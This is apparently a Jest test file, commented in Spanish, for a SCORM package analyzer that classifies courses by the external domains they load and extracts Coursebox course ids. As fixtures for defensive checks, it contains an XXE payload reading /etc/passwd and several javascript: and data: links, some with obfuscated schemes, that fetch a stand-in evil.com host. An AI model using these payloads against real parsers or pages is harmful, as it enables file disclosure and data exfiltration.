// lib/sig/__tests__/scorm-manifiesto.test.ts
//
// El manifiesto del paquete ENTREGADO está acá tal como viene (recortado a lo que importa),
// porque es el caso real: un paquete de DESPACHO cuyo contenido no está en el zip. La
// verificación 3 del requerimiento es exactamente esta prueba.

import { analizarManifiesto, cursoExternoDe, dominiosDe } from '../scorm-manifiesto';

const ENTREGADO = `<?xml version="1.0" encoding="UTF-8"?>
<manifest identifier="SingleCourseManifest" version="1.1"
          xmlns="http://www.imsglobal.org/xsd/imscp_v1p1"
          xmlns:adlcp="http://www.adlnet.org/xsd/adlcp_v1p3"
          xmlns:imsss="http://www.imsglobal.org/xsd/imsss">
  <metadata>
    <schema>ADL SCORM</schema>
    <schemaversion>2004 3rd Edition</schemaversion>
  </metadata>
  <organizations default="B0">
    <organization identifier="B0">
      <title>Codificación Segura</title>
      <item identifier="it1" identifierref="c1" isvisible="true">
        <title>Codificación Segura</title>
        <imsss:sequencing>
          <imsss:deliveryControls tracked="true" completionSetByContent="true" objectiveSetByContent="true"/>
        </imsss:sequencing>
      </item>
    </organization>
  </organizations>
  <resources>
    <resource identifier="c1" type="webcontent" adlcp:scormType="sco" href="index.html">
      <file href="index.html" />
    </resource>
  </resources>
</manifest>`;

const AUTOCONTENIDO = `<?xml version="1.0" encoding="UTF-8"?>
<manifest identifier="M1" xmlns="http://www.imsglobal.org/xsd/imscp_v1p1"
          xmlns:adlcp="http://www.adlnet.org/xsd/adlcp_v1p3">
  <metadata><schema>ADL SCORM</schema><schemaversion>2004 4th Edition</schemaversion></metadata>
  <organizations default="O1">
    <organization identifier="O1">
      <title>Inducción SGSI</title>
      <item identifier="i1" identifierref="r1"><title>Módulo único</title></item>
    </organization>
  </organizations>
  <resources>
    <resource identifier="r1" type="webcontent" adlcp:scormType="sco" href="shared/launch.html">
      <file href="shared/launch.html"/>
    </resource>
  </resources>
</manifest>`;

const DOS_SCO = AUTOCONTENIDO.replace(
  '<item identifier="i1" identifierref="r1"><title>Módulo único</title></item>',
  '<item identifier="i1" identifierref="r1"><title>Uno</title></item>' +
    '<item identifier="i2" identifierref="r1"><title>Dos</title></item>',
);

const SCORM_12 = AUTOCONTENIDO.replace('2004 4th Edition', '1.2');

describe('analizarManifiesto · el paquete entregado', () => {
  const r = analizarManifiesto(ENTREGADO, [
    'imsmanifest.xml',
    'index.html',
    'adlcp_v1p3.xsd',
  ]);

  it('lo acepta', () => {
    expect(r.ok).toBe(true);
  });

  it('detecta la edición y el título', () => {
    if (!r.ok) throw new Error(r.motivo);
    expect(r.paquete.edicion).toBe('2004 3rd Edition');
    expect(r.paquete.tituloOrganizacion).toBe('Codificación Segura');
    expect(r.paquete.organizacionId).toBe('B0');
  });

  it('encuentra el SCO de entrada', () => {
    if (!r.ok) throw new Error(r.motivo);
    expect(r.paquete.entradaHref).toBe('index.html');
  });

  // §2 · el curso NO está en el zip: index.html carga un driver y un iframe de un tercero.
  // Es lo que separa «este curso no comparte datos» de «este curso comparte correo y
  // nombre», así que la clase no es decorativa.
  it('lo clasifica como DESPACHO por el contenido del SCO', () => {
    const conShell = analizarManifiesto(ENTREGADO, ['imsmanifest.xml', 'index.html'], {
      'index.html':
        '<script src="https://my.coursebox.ai/assets/scripts/scormxd-driver.min.js"></script>' +
        '<iframe name="sxdclient_iframe"></iframe>' +
        '<script>new ScormXDDriver("2004").init("sxdclient_iframe", {remoteurl: "https://my.coursebox.ai"});</script>',
    });
    if (!conShell.ok) throw new Error(conShell.motivo);
    expect(conShell.paquete.clase).toBe('DESPACHO');
    expect(conShell.paquete.dominiosExternos).toEqual(['https://my.coursebox.ai']);
  });
});

describe('analizarManifiesto · un paquete autocontenido', () => {
  it('lo clasifica como AUTOCONTENIDO y sin dominios externos', () => {
    const r = analizarManifiesto(AUTOCONTENIDO, ['imsmanifest.xml', 'shared/launch.html'], {
      'shared/launch.html': '<script src="scorm-api.js"></script><h1>Inducción</h1>',
    });
    if (!r.ok) throw new Error(r.motivo);
    expect(r.paquete.clase).toBe('AUTOCONTENIDO');
    expect(r.paquete.dominiosExternos).toEqual([]);
  });
});

// EL DEFECTO QUE ESTO CIERRA.
//
// El analisis miraba UNICAMENTE el HTML de entrada. Coursebox pone su dominio ahi mismo, asi
// que su paquete se clasificaba bien; pero un despacho de otro proveedor que arme la URL
// dentro de su propio `.js` se clasificaba **AUTOCONTENIDO**, con dos consecuencias:
//
//   · la CSP le negaba el dominio y el curso quedaba en pantalla en blanco, y
//   · la ficha le afirmaba a un auditor que «el contenido no sale de la aplicacion»,
//     mientras el correo y el nombre de cada persona salian igual.
//
// La segunda es la grave: es una evidencia falsa, no una molestia.
describe('analizarManifiesto · el dominio escondido en el .js del lanzador', () => {
  it('encuentra el dominio aunque no este en el HTML', () => {
    const r = analizarManifiesto(
      AUTOCONTENIDO,
      ['imsmanifest.xml', 'shared/launch.html', 'shared/driver.js'],
      {
        'shared/launch.html': '<script src="driver.js"></script><iframe id="curso"></iframe>',
        // La ruta se resuelve contra la carpeta del SCO, no contra la raiz del paquete.
        'shared/driver.js': 'var REMOTO = "https://cursos.proveedor.com/launch";',
      },
    );
    if (!r.ok) throw new Error(r.motivo);
    expect(r.paquete.clase).toBe('DESPACHO');
    expect(r.paquete.dominiosExternos).toEqual(['https://cursos.proveedor.com']);
  });

  // Acotado a lo que el SCO CARGA. Un `.js` que el paquete trae pero nadie referencia no
  // corre nunca, y meterlo en la CSP seria abrirle un dominio a codigo muerto.
  it('no mira un .js que el SCO no carga', () => {
    const r = analizarManifiesto(
      AUTOCONTENIDO,
      ['imsmanifest.xml', 'shared/launch.html', 'shared/sobrante.js'],
      {
        'shared/launch.html': '<h1>Inducción</h1>',
        'shared/sobrante.js': 'fetch("https://analytics.ejemplo.com/ping")',
      },
    );
    if (!r.ok) throw new Error(r.motivo);
    expect(r.paquete.clase).toBe('AUTOCONTENIDO');
  });

  // Los namespaces XML son URLs y NO son origenes de contenido: nadie descarga nada de
  // `www.w3.org/2000/svg`. Colarlos convertiria cualquier paquete con un SVG en un
  // «DESPACHO que comparte correo y nombre con w3.org», que es mentira en la otra
  // direccion, y ademas le abriria el dominio en la CSP.
  it('los namespaces XML no son dominios externos', () => {
    const r = analizarManifiesto(AUTOCONTENIDO, ['imsmanifest.xml', 'shared/launch.html'], {
      'shared/launch.html':
        '<svg xmlns="http://www.w3.org/2000/svg"></svg>' +
        '<!-- http://www.imsglobal.org/xsd/imscp_v1p1 http://www.adlnet.org/xsd/adlcp_v1p3 -->',
    });
    if (!r.ok) throw new Error(r.motivo);
    expect(r.paquete.clase).toBe('AUTOCONTENIDO');
    expect(r.paquete.dominiosExternos).toEqual([]);
  });

  // Coursebox sigue saliendo igual: su dominio esta inline en el HTML de entrada.
  it('el paquete de Coursebox sigue dando DESPACHO con su dominio', () => {
    const r = analizarManifiesto(ENTREGADO, ['imsmanifest.xml', 'index.html'], {
      'index.html':
        '<script src="https://my.coursebox.ai/assets/scripts/scormxd-driver.min.js"></script>',
    });
    if (!r.ok) throw new Error(r.motivo);
    expect(r.paquete.clase).toBe('DESPACHO');
    expect(r.paquete.dominiosExternos).toEqual(['https://my.coursebox.ai']);
  });
});

describe('analizarManifiesto · lo que se rechaza con motivo', () => {
  // D-3 · fase 1 es un solo SCO. Ejecutar el primero y dar por hecho el curso completo
  // sería peor que rechazarlo: la asignación se cerraría con medio curso visto.
  it('rechaza el multi-SCO diciendo cuántos encontró', () => {
    const r = analizarManifiesto(DOS_SCO, ['imsmanifest.xml', 'shared/launch.html']);
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.motivo).toMatch(/2 SCO/);
  });

  it('rechaza SCORM 1.2 nombrando la versión', () => {
    const r = analizarManifiesto(SCORM_12, ['imsmanifest.xml', 'shared/launch.html']);
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.motivo).toMatch(/1\.2/);
  });

  it('rechaza el manifiesto cuyo SCO no está en el paquete', () => {
    const r = analizarManifiesto(AUTOCONTENIDO, ['imsmanifest.xml']);
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.motivo).toMatch(/shared\/launch\.html/);
  });

  it('rechaza un XML que no es un manifiesto', () => {
    const r = analizarManifiesto('<html><body>no soy un manifiesto</body></html>', []);
    expect(r.ok).toBe(false);
  });

  // P7 · XXE. El archivo lo sube un humano y el parser no debe resolver entidades externas.
  it('no resuelve entidades externas', () => {
    const xxe = `<?xml version="1.0"?>
<!DOCTYPE manifest [<!ENTITY secreto SYSTEM "file:///etc/passwd">]>
<manifest identifier="M" xmlns="http://www.imsglobal.org/xsd/imscp_v1p1">
  <metadata><schemaversion>2004 3rd Edition</schemaversion></metadata>
  <organizations default="O"><organization identifier="O"><title>&secreto;</title>
    <item identifier="i" identifierref="r"><title>t</title></item></organization></organizations>
  <resources><resource identifier="r" type="webcontent" href="a.html"><file href="a.html"/></resource></resources>
</manifest>`;
    const r = analizarManifiesto(xxe, ['imsmanifest.xml', 'a.html']);
    // Pase o falle el análisis, lo que NUNCA puede aparecer es el contenido del archivo.
    const texto = JSON.stringify(r);
    expect(texto).not.toMatch(/root:/);
  });
});

describe('cursoExternoDe · el id del curso de Coursebox, para cruzar con el webhook', () => {
  // El `index.html` del despacho lleva el id del curso DENTRO del `course_token`, que es
  // base64 de la URL del curso. Es la llave con la que el webhook «Course Completed» de
  // Coursebox (campo `courseId`) se cruza con nuestro `PaqueteScorm`.
  const INDEX_DESPACHO = `<!doctype html><html><head>
    <script src="https://my.coursebox.ai/assets/scripts/scormxd-driver.min.js"></script></head>
    <body><script>
      var config = { remoteurl: "https://my.coursebox.ai",
        contenturl: "https://my.coursebox.ai/scormxd/access?course_token=aHR0cHM6Ly9teS5jb3Vyc2Vib3guYWkvY291cnNlcy8wMWEwYTgyNi1iYjlhLTdhZjYtYTEwZi0wNGNiZDNkNTEwMmUvYWJvdXQ%3D&student_id=LEARNER_ID&student_name=LEARNER_NAME" };
    </script></body></html>`;

  it('saca el id del curso del course_token en base64', () => {
    expect(cursoExternoDe([INDEX_DESPACHO])).toBe('01a0a826-bb9a-7af6-a10f-04cbd3d5102e');
  });

  it('también lo saca de una URL de curso escrita en claro', () => {
    expect(cursoExternoDe(['<iframe src="https://my.coursebox.ai/courses/196716/about"></iframe>'])).toBe(
      '196716',
    );
  });

  it('un paquete autocontenido no tiene id externo', () => {
    expect(cursoExternoDe(['<html><script src="scorm.js"></script></html>', 'var x = 1;'])).toBeNull();
  });

  it('no revienta con basura ni con un token que no es base64 de una URL', () => {
    expect(cursoExternoDe(['course_token=no-es-base64-real'])).toBeNull();
    expect(cursoExternoDe([''])).toBeNull();
  });
});

describe('un hipervínculo no es un origen de contenido', () => {
  // Un `<a href>` NO carga nada y NO transmite nada: es una navegación que la persona puede
  // tomar, con su propia sesión y en otra pestaña. Ninguna directiva de CSP la gobierna.
  //
  // Clasificarlo como DESPACHO hace que `abrirIntento` anote «correo y nombre → ese dominio»
  // en la bitácora de datos a terceros. Es una afirmación falsa ante un auditor, y además le
  // abre el dominio en la CSP. Es el mismo argumento del filtro de NAMESPACES.
  const SOLO_ENLACE = `<html><body>
    <h2>Practica en el sistema</h2>
    <a href="https://org8fcf0faf.crm3.dynamics.com/main.aspx?etn=lead" target="_blank">Mis leads</a>
  </body></html>`;

  it('descarta el dominio que sólo aparece como destino de un <a href>', () => {
    expect(dominiosDe(SOLO_ENLACE)).toEqual([]);
  });

  it('el paquete que sólo enlaza afuera es AUTOCONTENIDO', () => {
    const r = analizarManifiesto(AUTOCONTENIDO, ['imsmanifest.xml', 'shared/launch.html'], {
      'shared/launch.html': SOLO_ENLACE,
    });
    expect(r.ok).toBe(true);
    if (!r.ok) return;
    expect(r.paquete.clase).toBe('AUTOCONTENIDO');
    expect(r.paquete.dominiosExternos).toEqual([]);
  });

  // **La otra mitad, y es la que prueba que esto no es una puerta.** Un despacho real CARGA
  // al tercero. Si el mismo dominio aparece además cargándose, cuenta como antes.
  it('el mismo dominio, si además se CARGA, sigue siendo DESPACHO', () => {
    const enlazaYCarga = `<html><body>
      <a href="https://proveedor.example.com/ayuda" target="_blank">Ayuda</a>
      <script src="https://proveedor.example.com/driver.js"></script>
    </body></html>`;

    expect(dominiosDe(enlazaYCarga)).toEqual(['https://proveedor.example.com']);

    const r = analizarManifiesto(AUTOCONTENIDO, ['imsmanifest.xml', 'shared/launch.html'], {
      'shared/launch.html': enlazaYCarga,
    });
    expect(r.ok).toBe(true);
    if (!r.ok) return;
    expect(r.paquete.clase).toBe('DESPACHO');
  });

  it('un iframe al tercero sigue siendo DESPACHO aunque también haya un enlace', () => {
    const conIframe = `<html><body>
      <a href="https://proveedor.example.com/ayuda">Ayuda</a>
      <iframe src="https://proveedor.example.com/curso?course_token=abc"></iframe>
    </body></html>`;
    expect(dominiosDe(conIframe)).toEqual(['https://proveedor.example.com']);
  });

  // Un `.js` no tiene `<a href>`, así que nada se descarta ahí. Es donde un driver de
  // despacho arma la URL del proveedor, y ese escaneo no se toca.
  it('no descarta nada dentro de un JavaScript', () => {
    expect(dominiosDe(`var url = "https://proveedor.example.com/lanzar";`)).toEqual([
      'https://proveedor.example.com',
    ]);
  });

  // **El agujero que este filtro podría abrir, cerrado.** La exención vale para una
  // NAVEGACIÓN: la persona se va al sitio del tercero, en otra pestaña y con su propia
  // sesión. Un `javascript:` no es eso — corre en el documento actual, transmite al hacer
  // clic, y la CSP sí lo gobierna (`connect-src`). Un `data:` tampoco: navega a un
  // documento con origen opaco.
  //
  // El caso concreto que se colaba: `&quot;` NO es una comilla literal, así que el grupo
  // `[^"']+` no se corta ahí y el dominio quedaba DENTRO del href capturado, contándose
  // como destino de enlace. Con comillas reales el `'` corta la captura y ya se detectaba.
  it('un href que no es navegación no gana la exención', () => {
    expect(
      dominiosDe(`<a href="javascript:fetch(&quot;https://evil.com/exfiltra&quot;)">Continuar</a>`),
    ).toEqual(['https://evil.com']);
    expect(
      dominiosDe(`<a href="javascript:window.location.href=&quot;https://evil.com/go&quot;">x</a>`),
    ).toEqual(['https://evil.com']);
    expect(
      dominiosDe(`<a href="data:text/html,<script>fetch('https://evil.com')</script>">x</a>`),
    ).toEqual(['https://evil.com']);
  });

  // Y la contraparte: un enlace normal SIGUE exento, incluido el redirector, que es
  // navegación aunque el destino final esté en la URL.
  it('una navegación normal sigue exenta', () => {
    expect(dominiosDe(`<a href="https://norma.example.com/iso27001">La norma</a>`)).toEqual([]);
    expect(
      dominiosDe(`<a href="https://link.example.com/r?u=https://destino.example.com">ir</a>`),
    ).toEqual([]);
    expect(dominiosDe(`<a href="//cdn.example.com/pagina">x</a>`)).toEqual([]);
    expect(dominiosDe(`<a href="   https://norma.example.com/x">x</a>`)).toEqual([]);
  });

  // **Ofuscaciones del esquema.** Las seis las EJECUTA el navegador: el parser de HTML
  // decodifica las entidades del valor del atributo antes de que la URL exista, y el
  // analizador de URL descarta TAB, LF, CR y los controles C0 iniciales antes de leer el
  // esquema. Preguntar «¿qué esquema declara?» obliga a reproducir esa normalización con
  // expresiones regulares, que es donde vive una familia entera de evasiones.
  //
  // La pregunta que sí discrimina es otra: **¿el `href` ES la URL, o la lleva ADENTRO de
  // otra cosa?** Las seis la llevan adentro, y ninguna empieza por ella.
  it('ninguna ofuscación del esquema gana la exención', () => {
    const casos = [
      `<a href="&#106;avascript:fetch(&quot;https://evil.com/x&quot;)">x</a>`,
      `<a href="&#x6a;avascript:fetch(&quot;https://evil.com/x&quot;)">x</a>`,
      `<a href="java\tscript:fetch(&quot;https://evil.com/x&quot;)">x</a>`,
      `<a href="java\nscript:fetch(&quot;https://evil.com/x&quot;)">x</a>`,
      `<a href="java&#9;script:fetch(&quot;https://evil.com/x&quot;)">x</a>`,
      `<a href="javascript:fetch(&quot;https://evil.com/x&quot;)">x</a>`,
    ];
    // En bloque y no en un bucle: un `for` con `expect` adentro corta en el primero que
    // falla y esconde los otros cinco. Así el rojo muestra las seis de una.
    expect(casos.map(dominiosDe)).toEqual(casos.map(() => ['https://evil.com']));
  });
});
